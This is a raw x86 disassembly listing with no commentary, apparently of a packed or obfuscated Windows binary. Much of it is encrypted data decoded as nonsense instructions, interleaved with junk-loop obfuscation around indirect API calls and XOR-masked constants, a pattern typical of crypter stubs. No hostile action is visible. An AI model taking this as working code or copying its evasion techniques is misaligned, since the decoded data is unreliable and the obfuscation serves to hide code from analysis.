  4030a4:	mov    ds:0xc4cb9392,eax
  4030a9:	xchg   BYTE PTR [edx-0x7d],ah
  4030ac:	mov    edx,0x5d649720
  4030b1:	aaa    
  4030b2:	nop
  4030b3:	inc    edx
  4030b4:	pop    eax
  4030b5:	ja     0x4030f8
  4030b7:	loopne 0x40306c
  4030b9:	imul   ebx,DWORD PTR [eax+ecx*4+0x28d64bdb],0x91949d6d
  4030c4:	pop    ebp
  4030c5:	push   ebx
  4030c6:	pop    ecx
  4030c7:	clc    
  4030c8:	or     al,bl
  4030ca:	or     DWORD PTR [esi],ebx
  4030cc:	jle    0x403106
  4030ce:	mov    edx,0x3d041e8f
  4030d3:	sub    al,0x54
  4030d5:	std    
  4030d6:	imul   ebx,DWORD PTR [esi+0x45],0xffffffb9
  4030da:	mov    ah,0xdc
  4030dc:	sbb    BYTE PTR [ecx],bl
  4030de:	sbb    al,0xb6
  4030e0:	inc    ebx
  4030e1:	sub    BYTE PTR [edi-0x26],bl
  4030e4:	adc    eax,0x17b7732f
  4030e9:	cmp    edi,DWORD PTR [ecx+eiz*2]
  4030ec:	stos   BYTE PTR es:[edi],al
  4030ed:	inc    edx
  4030ee:	out    0xad,al
  4030f0:	push   edx
  4030f1:	stos   BYTE PTR es:[edi],al
  4030f2:	push   esi
  4030f3:	sbb    bl,dl
  4030f5:	xchg   esi,eax
  4030f6:	xor    al,0x83
  4030f8:	les    ecx,FWORD PTR [eax+0x765e339e]
  4030fe:	or     eax,DWORD PTR [ebx-0x7c]
  403101:	ret    
  403102:	mov    esp,0x57fd314c
  403107:	jg     0x4030c4
  403109:	cwde   
  40310a:	out    0x82,eax
  40310c:	iret   
  40310d:	jl     0x40312a
  40310f:	arpl   dx,si
  403111:	mov    ds:0x7f75dba7,eax
  403116:	sub    edi,ebx
  403118:	jo     0x403130
  40311a:	mov    ecx,0x554180be
  40311f:	rol    edi,0xc2
  403122:	adc    dl,BYTE PTR [eax]
  403124:	es push esi
  403126:	pushf  
  403127:	jnp    0x403106
  403129:	loop   0x40312f
  40312b:	fidiv  WORD PTR [eax]
  40312d:	popf   
  40312e:	jo     0x40315b
  403130:	aas    
  403131:	vfnmsub231ps zmm5{z},zmm5,zmm5,{ru-sae}
  403137:	je     0x4031a8
  403139:	sar    DWORD PTR [eax+ebp*1],1
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x27a0c15c],0x8d
  40315f:	fidivr WORD PTR [edx-0x58181e9]
  403165:	jg     0x4031e5
  403167:	jle    0x40316a
  403169:	(bad)  [ebp+0x68]
  40316c:	out    dx,eax
  40316d:	test   eax,0x7a21bb1b
  403172:	add    edi,DWORD PTR [ecx+0x38671e98]
  403178:	loop   0x403106
  40317a:	add    DWORD PTR [ebx],eax
  40317c:	dec    edx
  40317d:	and    al,0x89
  40317f:	call   0xad7ad977
  403184:	(bad)  
  403185:	dec    esi
  403186:	mov    eax,ds:0xdba8d622
  40318b:	lds    edi,FWORD PTR ds:0xc965bf1c
  403191:	fwait
  403192:	dec    ebp
  403193:	popa   
  403194:	stos   BYTE PTR es:[edi],al
  403195:	cld    
  403196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403197:	std    
  403198:	sbb    BYTE PTR [edi*2+0x10bf83ad],ch
  40319f:	xor    eax,ebp
  4031a1:	mov    esi,0x2f1ca4d7
  4031a6:	pop    edi
  4031a7:	lea    esp,[eiz*8-0x7d53c91a]
  4031ae:	mov    ds:0x78348d06,eax
  4031b3:	sub    dh,BYTE PTR [esi-0x30]
  4031b6:	or     DWORD PTR [edi-0x46d818b6],edi
  4031bc:	mov    bl,0x90
  4031be:	mov    ch,0xcc
  4031c0:	jp     0x403166
  4031c2:	test   DWORD PTR [ebp+edi*4+0x64],esp
  4031c6:	out    dx,al
  4031c7:	in     al,dx
  4031c8:	push   es
  4031c9:	mov    ah,0xd1
  4031cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031cc:	sub    cl,BYTE PTR [edx]
  4031ce:	cmp    al,0x6d
  4031d0:	outs   dx,BYTE PTR ds:[esi]
  4031d1:	call   0x94a3:0x9280161
  4031d8:	and    BYTE PTR [ebx-0x5],ch
  4031db:	push   cs
  4031dc:	push   0xffffffa9
  4031de:	int    0x89
  4031e0:	mov    DWORD PTR [edx+0x1a9f4219],esp
  4031e6:	pusha  
  4031e7:	jmp    0x356e:0x4cfefd96
  4031ee:	mov    ch,0x75
  4031f0:	clc    
  4031f1:	nop
  4031f2:	pop    ds
  4031f3:	push   esp
  4031f4:	pop    ebp
  4031f5:	push   esi
  4031f6:	call   ecx
  4031f8:	or     DWORD PTR [ebx-0x17],esp
  4031fb:	out    0xb2,eax
  4031fd:	xchg   edx,eax
  4031fe:	arpl   WORD PTR [ecx+0x62],bp
  403201:	sbb    al,0xdd
  403203:	mov    cl,0xac
  403205:	or     ebp,ebx
  403207:	push   edx
  403208:	mov    ah,0xa3
  40320a:	fdiv   QWORD PTR [edi+0x6a6ad598]
  403210:	test   al,0xee
  403212:	jp     0x403221
  403214:	mov    fs:0x38e9a869,eax
  40321a:	repz int 0xae
  40321d:	mov    bh,0x31
  40321f:	scas   eax,DWORD PTR es:[edi]
  403220:	add    dl,BYTE PTR [eax]
  403222:	sub    DWORD PTR [edi+0x13],esp
  403225:	dec    esi
  403226:	test   eax,0x91a23fe1
  40322b:	(bad)  
  40322c:	add    eax,0xe4d6c42a
  403231:	adc    al,0x97
  403233:	mov    ecx,0x21c21e64
  403238:	cs jge 0x40329c
  40323b:	sub    DWORD PTR [edi+0x6429474b],ecx
  403241:	pop    esi
  403242:	and    ebp,esi
  403244:	dec    edx
  403245:	dec    ebx
  403246:	xchg   ebx,eax
  403247:	pop    eax
  403248:	ror    DWORD PTR [edi],1
  40324a:	or     bl,BYTE PTR [ecx-0x57c7e0fb]
  403250:	shl    dh,cl
  403252:	ret    
  403253:	imul   esp,DWORD PTR [ebx-0x36],0xffffffc1
  403257:	ret    
  403258:	test   eax,0xc9072df3
  40325d:	fist   DWORD PTR [ecx]
  40325f:	and    DWORD PTR [edx],esp
  403261:	fld    QWORD PTR [ebp-0x1b6dfa5f]
  403267:	loopne 0x4032b4
  403269:	or     ebx,ebx
  40326b:	(bad)  
  40326c:	jns    0x40328c
  40326e:	push   ebx
  40326f:	sbb    al,0x29
  403271:	xchg   esi,eax
  403272:	fisubr DWORD PTR [edi]
  403274:	test   al,0x90
  403276:	jnp    0x403283
  403278:	test   al,0xfc
  40327a:	mov    al,0x24
  40327c:	pop    ebx
  40327d:	(bad)  
  40327e:	xchg   ecx,eax
  40327f:	in     eax,dx
  403280:	push   edx
  403281:	lock sub ah,dl
  403284:	pushf  
  403285:	(bad)  
  403286:	jg     0x40324a
  403288:	sti    
  403289:	daa    
  40328a:	or     eax,0x70ff75b8
  40328f:	lea    esp,[ebx+eax*2]
  403292:	aas    
  403293:	xchg   ebx,eax
  403294:	mov    dh,0x64
  403296:	aaa    
  403297:	test   DWORD PTR [ebx+ebp*4+0x13],esi
  40329b:	jmp    0x818:0x6571babc
  4032a2:	cli    
  4032a3:	mov    WORD PTR [edx-0x71],cs
  4032a6:	mov    bl,0xa5
  4032a8:	mov    dh,0x45
  4032aa:	adc    eax,0xc3183841
  4032af:	(bad)  
  4032b0:	mov    dh,0x99
  4032b2:	mov    dh,0xd8
  4032b4:	je     0x40328b
  4032b6:	add    al,0x75
  4032b8:	or     eax,0x48faaf59
  4032bd:	iret   
  4032be:	inc    ecx
  4032bf:	jo     0x4032b9
  4032c1:	adc    esp,DWORD PTR [ebp-0x75e65fcf]
  4032c7:	(bad)  [ecx-0x5c]
  4032ca:	dec    edx
  4032cb:	daa    
  4032cc:	adc    cl,BYTE PTR [edi]
  4032ce:	add    al,0xe1
  4032d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d1:	adc    edi,DWORD PTR [edi+0x14]
  4032d4:	adc    ah,BYTE PTR [ebp-0x15b574f8]
  4032da:	pop    esp
  4032db:	cmp    ecx,DWORD PTR [edi]
  4032dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032de:	imul   DWORD PTR [edx]
  4032e0:	sub    bl,BYTE PTR [edx+0x6a7b0a7]
  4032e6:	loop   0x403271
  4032e8:	dec    ecx
  4032e9:	sub    al,0xeb
  4032eb:	push   ds
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x4337db,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x4337db
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x4337db,ecx
  40331d:	cmp    DWORD PTR ds:0x4337db,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x4337db,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x43386f,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x433857,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43379f
  40336b:	add    DWORD PTR ds:0x433783,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x4337d7,0x1e
  40338b:	cmp    DWORD PTR ds:0x4337d7,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x4337d7,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x4337d7,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x4337d7
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x4337d7,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x4337d7
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x4337d7,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x433867
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x4337c7
  4033f2:	mov    edi,DWORD PTR ds:0x433807
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x4337e7,0x1c
  40340f:	cmp    DWORD PTR ds:0x4337e7,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x4337e7,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x4337e7,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x4337e7
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x4337e7,edi
  40344c:	mov    edi,DWORD PTR ds:0x4337e7
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x4337e7,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x433863
  403467:	and    edx,DWORD PTR ds:0x433897
  40346d:	mov    DWORD PTR ds:0x433863,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43381b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43389f
  40349f:	adc    DWORD PTR ds:0x43377f,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433897,0x10
  4034c6:	cmp    DWORD PTR ds:0x433897,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433897,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433897,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433897
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433897,edi
  403505:	mov    edi,DWORD PTR ds:0x433897
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433897,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x4338ab,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x55292b76]
  403537:	fstp   QWORD PTR [esi+eax*8+0x15]
  40353b:	jle    0x4035bb
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x403596
  403542:	xchg   esi,ebp
  403544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403545:	loope  0x403559
  403547:	dec    ebp
  403548:	fdiv   QWORD PTR [esi-0x39db3e66]
  40354e:	(bad)  
  40354f:	jnp    0x403541
  403551:	pop    ds
  403552:	repz or ebp,DWORD PTR [edi-0x41]
  403556:	(bad)  [edx-0x9]
  403559:	mov    WORD PTR fs:[esi+esi*8-0x1f93f7f9],ss
  403561:	pop    esp
  403562:	hlt    
  403563:	mov    ch,0x1b
  403565:	jp     0x4035e1
  403567:	jecxz  0x4034ea
  403569:	push   ebx
  40356b:	xor    ch,BYTE PTR [ebx]
  40356d:	push   esp
  40356e:	ins    BYTE PTR es:[edi],dx
  40356f:	sti    
  403570:	mov    ds:0xc16fcb63,al
  403575:	nop
  403576:	push   eax
  403577:	das    
  403578:	js     0x4035eb
  40357a:	jno    0x4035f1
  40357c:	mov    bh,BYTE PTR [eax+0x21aff846]
  403582:	les    esi,FWORD PTR [edi+0x6ba98bf7]
  403588:	in     al,dx
  403589:	les    eax,FWORD PTR [ecx-0x5e]
  40358c:	outs   dx,DWORD PTR ds:[esi]
  40358d:	or     DWORD PTR [edx+0xf],0x68
  403591:	rcl    DWORD PTR [ebx*2+0x3a9cf61],cl
  403598:	mov    al,ds:0x7d183b95
  40359d:	add    BYTE PTR [eax+0x5c],bh
  4035a0:	imul   ebp,DWORD PTR [ecx-0x22e07ead],0x2901923f
  4035aa:	xchg   ecx,eax
  4035ab:	dec    esi
  4035ac:	xor    eax,0x4ffc0008
  4035b1:	cmc    
  4035b2:	icebp  
  4035b3:	jo     0x4035a3
  4035b5:	pop    ebp
  4035b6:	(bad)  
  4035b7:	stos   BYTE PTR es:[edi],al
  4035b8:	out    0xe8,al
  4035ba:	xchg   bx,ax
  4035bc:	fstp   DWORD PTR [ebx+esi*2+0x48]
  4035c0:	sub    al,0xc2
  4035c2:	xchg   edi,eax
  4035c3:	inc    edi
  4035c4:	scas   al,BYTE PTR es:[edi]
  4035c5:	addr16 call 0x6d24:0x42a2b833
  4035cd:	enter  0xb440,0x49
  4035d1:	fnstcw WORD PTR [esi]
  4035d3:	retf   0xbd8c
  4035d6:	jmp    0x4035bc
  4035d8:	adc    BYTE PTR [ebx+0xf65e418],0xa7
  4035df:	mov    al,0xc6
  4035e1:	jg     0x40360c
  4035e3:	stos   BYTE PTR es:[edi],al
  4035e4:	fldenv [esi+0x5ace77e8]
  4035ea:	fnstenv [eax-0x6f]
  4035ed:	xor    DWORD PTR [esp+ebx*8+0x4c],edx
  4035f1:	push   ds
  4035f2:	std    
  4035f3:	xchg   ebp,eax
  4035f4:	daa    
  4035f5:	into   
  4035f6:	dec    ebx
  4035f7:	mov    DWORD PTR [ebx+0x21],esp
  4035fa:	(bad)  
  4035fb:	xchg   edx,eax
  4035fc:	jbe    0x403584
  4035fe:	xchg   BYTE PTR [esi-0x67],dl
  403601:	aaa    
  403602:	shr    DWORD PTR [eax+0x58],0x8c
  403606:	in     eax,dx
  403607:	and    edx,DWORD PTR [eax-0x29]
  40360a:	sbb    eax,DWORD PTR [ebx]
  40360c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360d:	push   esp
  40360e:	push   0x30
  403610:	mov    ebp,?
  403612:	mov    edi,0xaad58858
  403617:	fidivr WORD PTR [esi+eax*4]
  40361a:	imul   eax,DWORD PTR [ebp+0x71153a3c],0xfffffff3
  403621:	pop    esp
  403622:	popa   
  403623:	mov    ds:0xf063585,al
  403628:	push   esi
  403629:	xor    BYTE PTR [ecx-0x70],ch
  40362c:	std    
  40362d:	xor    dl,BYTE PTR [esi+esi*1+0x8]
  403631:	sbb    DWORD PTR ds:0x4e471147,ecx
  403637:	xor    BYTE PTR [edi-0x79],dl
  40363a:	repz cmp eax,0x1bc39e95
  403640:	dec    ebx
  403641:	dec    ebp
  403642:	lock pop edi
  403644:	inc    eax
  403645:	sub    BYTE PTR [ebp+0x4d],bh
  403648:	and    BYTE PTR [eax+0x692d16ef],al
  40364e:	jo     0x4036c3
  403650:	mov    bh,0xde
  403652:	inc    edx
  403653:	imul   ecx,DWORD PTR es:[ebx],0xffffff88
  403657:	pushf  
  403658:	xchg   esp,eax
  403659:	lods   al,BYTE PTR ds:[esi]
  40365a:	dec    ebx
  40365b:	not    BYTE PTR [edx]
  40365d:	mov    ds:0xdce3531f,eax
  403662:	out    0x6e,eax
  403664:	cwde   
  403665:	xchg   DWORD PTR [edx],eax
  403667:	cmp    edi,DWORD PTR [ecx-0x58]
  40366a:	sbb    ah,BYTE PTR [ebx]
  40366c:	loopne 0x40364f
  40366e:	or     eax,0xe33337a1
  403673:	aas    
  403674:	stos   DWORD PTR es:[edi],eax
  403675:	xchg   esp,eax
  403676:	mov    edx,0x61227b5c
  40367b:	xor    bl,bh
  40367d:	push   ebp
  40367e:	mov    bh,0x19
  403680:	jnp    0x403665
  403682:	adc    dh,BYTE PTR [edi+0x5b3a0da4]
  403688:	xchg   edi,eax
  403689:	jmp    0x403695
  40368b:	(bad)  
  40368c:	aas    
  40368d:	es sti 
  40368f:	pop    edi
  403690:	dec    ebp
  403691:	or     al,BYTE PTR [ebx-0x6e90138d]
  403697:	jle    0x4036e6
  403699:	arpl   sp,cx
  40369b:	cld    
  40369c:	pop    esp
  40369d:	add    al,0xe2
  40369f:	lods   al,BYTE PTR ds:[esi]
  4036a0:	gs nop
  4036a2:	mov    dl,0x44
  4036a4:	pop    es
  4036a5:	popf   
  4036a6:	outs   dx,DWORD PTR ds:[esi]
  4036a7:	push   ebx
  4036a8:	push   DWORD PTR [ecx+0x6fa5fdae]
  4036ae:	inc    ebx
  4036af:	inc    edi
  4036b0:	add    al,0xa5
  4036b2:	pop    ds
  4036b3:	pop    ebx
  4036b4:	sbb    al,0xe5
  4036b6:	bound  edx,QWORD PTR [ecx]
  4036b8:	in     al,0x3e
  4036ba:	dec    ebx
  4036bb:	cmp    ah,BYTE PTR [edi]
  4036bd:	and    edi,DWORD PTR [ebp+0x57]
  4036c0:	and    BYTE PTR [esi+edi*2+0x7b000163],cl
  4036c7:	mov    bl,0x2b
  4036c9:	out    dx,eax
  4036ca:	ds cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4036cd:	ds out 0x9a,eax
  4036d0:	mov    dh,0x40
  4036d2:	int3   
  4036d3:	mov    eax,ds:0x1492de82
  4036d8:	push   0x3f
  4036da:	mul    BYTE PTR [edi+0x62aceba0]
  4036e0:	sbb    dl,BYTE PTR [ebp-0x436686f1]
  4036e6:	ret    
  4036e7:	int3   
  4036e8:	push   ecx
  4036e9:	cmp    DWORD PTR [eax+edx*8],ebx
  4036ec:	call   0x6995:0x38c0c422
  4036f3:	loop   0x40369a
  4036f5:	test   ah,ch
  4036f7:	and    dl,BYTE PTR [edi]
  4036f9:	inc    esi
  4036fa:	mov    ch,0x40
  4036fc:	push   edi
  4036fd:	cmp    DWORD PTR [eax-0x38],edx
  403700:	jbe    0x403760
  403702:	and    edi,0xffffffb4
  403705:	xor    eax,0x2ca573c5
  40370a:	push   0xdb4b9cc8
  40370f:	leave  
  403710:	js     0x4036d7
  403712:	adc    ebx,DWORD PTR [eax-0x33]
  403715:	pop    ss
  403716:	out    dx,eax
  403717:	(bad)  
  403719:	lds    edx,FWORD PTR [ebp-0x7652e3af]
  40371f:	(bad)  
  403720:	dec    ecx
  403721:	push   ecx
  403722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403723:	cmp    DWORD PTR [ecx+ecx*8+0x54],0x6c0950b6
  40372b:	jnp    0x4037aa
  40372d:	mov    ebp,0x77cc1b63
  403732:	jecxz  0x403770
  403734:	and    ah,bl
  403736:	scas   eax,DWORD PTR es:[edi]
  403737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403738:	fwait
  403739:	ret    
  40373a:	push   ss
  40373b:	inc    esp
  40373c:	add    dl,al
  40373e:	fcom   DWORD PTR [ebx-0x44]
  403741:	cmp    edi,ebx
  403743:	and    bl,BYTE PTR [ecx+ebp*1]
  403746:	aas    
  403747:	push   0x2a1e724a
  40374c:	jae    0x403794
  40374e:	add    eax,0xc3802335
  403753:	sbb    al,0x50
  403755:	push   esp
  403756:	jb     0x40378e
  403758:	mov    ss,ebp
  40375a:	dec    edi
  40375b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40375c:	dec    esp
  40375d:	xchg   ebp,ebp
  40375f:	sbb    esp,DWORD PTR [edx+0x73dec77a]
  403765:	adc    dh,BYTE PTR [edx]
  403767:	push   eax
  403768:	jnp    0x403769
  40376a:	adc    eax,0xe0523aab
  40376f:	adc    bl,BYTE PTR [edx+0x2989b9a9]
  403775:	sub    al,0x73
  403777:	jo     0x40375e
  403779:	sbb    ecx,ebx
  40377b:	adc    DWORD PTR [edi],0x79
  40377e:	popa   
  40377f:	push   0xffffffe3
  403781:	mov    ds:0x8903d3ea,al
  403786:	in     al,dx
  403787:	pusha  
  403788:	gs push edx
  40378a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40378b:	pop    edx
  40378c:	dec    esp
  40378d:	div    BYTE PTR [eax]
  40378f:	mov    ds:0x1f1b12bd,eax
  403794:	in     eax,0x99
  403796:	ret    
  403797:	mov    esi,DWORD PTR [edx]
  403799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40379a:	sbb    dh,BYTE PTR [ebx]
  40379c:	push   0x2337c851
  4037a1:	ins    BYTE PTR es:[edi],dx
  4037a2:	aam    0x66
  4037a4:	fs jns 0x40381d
  4037a7:	repz loope 0x403772
  4037aa:	fwait
  4037ab:	xor    ebx,DWORD PTR ds:0x436f0d60
  4037b1:	in     al,0x22
  4037b3:	adc    eax,0x95b66c19
  4037b8:	(bad)  
  4037b9:	sub    ebp,DWORD PTR [edi]
  4037bb:	add    DWORD PTR [ecx-0x75],edi
  4037be:	ret    0x7f0b
  4037c1:	add    dl,BYTE PTR [eax-0x728c4ef1]
  4037c7:	or     ebx,DWORD PTR [ecx+ebx*4]
  4037ca:	xor    DWORD PTR [ecx],esi
  4037cc:	scas   al,BYTE PTR es:[edi]
  4037cd:	and    BYTE PTR [ebp-0x5f6851ba],dh
  4037d3:	icebp  
  4037d4:	shl    BYTE PTR [edi],0xee
  4037d7:	push   cs
  4037d8:	inc    esp
  4037d9:	or     eax,0x5d14db21
  4037de:	gs xchg edx,eax
  4037e0:	add    al,0xb6
  4037e3:	rcr    DWORD PTR [eax-0x21],1
  4037e6:	mov    esi,0x9a7e8f1f
  4037eb:	idiv   bl
  4037ed:	sub    bh,cl
  4037ef:	mov    ebx,edx
  4037f1:	jle    0x403817
  4037f3:	call   0xe93091e2
  4037f8:	dec    edx
  4037f9:	mov    ecx,0xd37219ea
  4037fe:	xchg   esi,eax
  4037ff:	shr    DWORD PTR [edi-0x41],0x24
  403803:	pop    eax
  403804:	sub    eax,0x59368f49
  403809:	xchg   esp,eax
  40380a:	jbe    0x403849
  40380c:	cdq    
  40380d:	test   BYTE PTR [eax-0x67],0xb3
  403811:	ins    BYTE PTR es:[edi],dx
  403812:	and    al,0xb1
  403814:	gs pusha 
  403816:	and    BYTE PTR [edi],cl
  403818:	inc    edi
  403819:	aas    
  40381a:	xchg   edi,ebp
  40381c:	sbb    cl,BYTE PTR [ebx-0x36]
  40381f:	addr16 push ebp
  403821:	cli    
  403822:	or     eax,0x62c7aa9b
  403827:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40382e:	sbb    edi,DWORD PTR ds:0x43377b
  403834:	mov    edx,DWORD PTR [ebp+0x8]
  403837:	sbb    edi,DWORD PTR ds:0x43382b
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x4338a7,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x4338a7
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x4338a7,edi
  403858:	cmp    DWORD PTR ds:0x4338a7,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x4338a7,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x4338a7
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x4338a7,edi
  40389c:	cmp    DWORD PTR ds:0x4338a7,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x4337eb,0x4338ab
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433813,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x43386b,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x4338a7,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x43386b,0x43382b
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x43377b,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433797,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433793,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43389b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x43377f,0x1d
  403935:	cmp    DWORD PTR ds:0x43377f,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x43377f,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x43377f,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x43377f
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x43377f,ebx
  403985:	mov    ebx,DWORD PTR ds:0x43377f
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x43377f,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x4337e7
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433793
  4039a6:	sub    edi,DWORD PTR ds:0x4338a3
  4039ac:	mov    DWORD PTR ds:0x433793,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433787,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433787,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433787,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433787
  4039ec:	dec    ebx
